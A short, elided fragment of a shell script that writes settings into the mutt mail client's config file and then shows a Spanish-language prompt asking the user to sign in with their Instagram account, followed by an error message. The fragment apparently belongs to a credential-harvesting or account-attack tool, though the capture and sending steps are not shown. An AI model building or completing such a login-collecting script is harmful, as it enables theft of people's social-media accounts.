...
echo "#" >> $HOME/.muttrc
echo "# These two lines appear to be needed on some Linux distros, like Arch Linux" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
...
printf "$Goke""\nACONTINUACION INICIE SESION CON SU CUENTA DE INSTAGRAM:\n\n\n"

printf "$Magenta"
while read -p  "Escriba su cuenta >>" email && [ -z  $email ]; do
...
printf "$Red""\nA ocurrido un error, asegurese de haber escrito su cuenta correctamente.\n"
